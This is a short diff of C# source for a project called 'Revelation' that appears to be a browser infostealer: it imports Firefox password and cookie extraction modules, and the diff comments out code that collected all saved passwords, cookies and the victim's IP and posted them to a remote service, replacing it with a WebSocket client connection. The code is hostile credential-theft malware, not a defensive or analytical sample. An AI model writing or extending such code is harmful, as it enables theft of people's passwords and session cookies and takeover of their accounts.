@@ -1,4 +1,5 @@
 ﻿using Revelation.common;
+using Revelation.connection;
 using Revelation.firefox.utils;
 using Revelation.passwords;
 using Revelation.passwords.utils_firefox;
@@ -22,15 +23,15 @@ namespace Revelation
 
         public static void start()
         {
+            connection();
 
-            var ip_adress = new IpAdress().get();
+            /*var ip_adress = new IpAdress().get();
 
 
             var passwords = get_all_passwords();
             var cookies = get_all_cookies();
 
-            ServiceConnection.post_passwords(passwords);
-            ServiceConnection.post_cookies(cookies);
+ 
             foreach (var password in passwords)
             {
                 Console.WriteLine("url : " + password.hostname);
@@ -51,11 +52,16 @@ namespace Revelation
                 Console.WriteLine("skey : " + cookie.key);
                 Console.WriteLine("-------------------------------------------------------------");
             }
-
+            */
             Console.Read();
         }
 
 
+        public static void connection()
+        {
+            WebSocketClient.Connection();
+
+        }
         public static List<Password> get_all_passwords()
         {
             var passwords = new List<Password>();
